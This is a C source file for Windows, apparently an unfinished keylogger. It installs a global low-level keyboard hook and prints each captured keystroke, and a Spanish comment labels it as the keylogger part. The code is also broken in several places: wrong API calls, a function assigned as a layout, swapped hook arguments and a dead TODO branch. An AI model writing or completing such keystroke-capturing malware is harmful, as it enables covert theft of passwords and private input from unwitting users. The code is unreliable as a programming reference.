#include <stdio.h>
#include <string.h>
#include <windows.h>

#include "dicrionary.h"

HHOOK keyboardHook;
HKL currentKeyboardLayout;

LRESULT CALLBACK hookCallback(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        //TODO LO DEL KEYLOGGER AQUI
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            HKL keyboardLayout = GetKeyboardLayout();
            if (keyboardLayout != currentKeyboardLayout) {
                currentKeyboardLayout = keybd_event;
                buildDictionary();
            }
            KBDLLHOOKSTRUCT* info = (KBDLLHOOKSTRUCT*) lParam;
            wchar_t wbuffer[6];
            char buffer[24], chr;
            int res = 1;
            if (info->vkCode == VK_ESCAPE) {
                strcpy(buffer, "[ESCAPE]");
            } else if (info->vkCode == VK_RETURN) {
                strcpy(buffer, "[RETURN]");
            } else if (info->vkCode >= VK_F1 && info->vkCode <= VK_F24) {
                sprintf(buffer, "[F%d]", info->vkCode - VK_F1 + 1);
            } else if ((chr = getKeyFromDictionary(info->vkCode, 0, 0, 0)) != 0) {
                buffer[0] = chr;
                buffer[1] = '\0';
            } else if (1) { //TODO
                
            } else {
                DWORD extend = 0;
                switch (info->vkCode) {
                    case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
                    case VK_PRIOR: case VK_NEXT:
                    case VK_END: case VK_HOME:
                    case VK_INSERT: case VK_DELETE:
                    case VK_DIVIDE:
                    case VK_NUMLOCK:
                        extend = 0x100; //Set extend bit
                        break;
                }
                if (GetKeyNameText((info->scanCode | extend) * 0x10000, buffer + 1, sizeof(buffer) - 1) > 0) {
                    res = 1;
                    buffer[0] = '[';
                    buffer[strlen(buffer)] = '\0';
                    buffer[strlen(buffer) - 1] = ']';
                }
            }
            if (res == 1) {
                printf("%s\n", buffer);
            }
        }
    }
    return CallNextHookEx(keyboardHook, code, lParam, wParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    currentKeyboardLayout = GetKeyboardLayout();
    buildDictionary();
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, hInstance, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}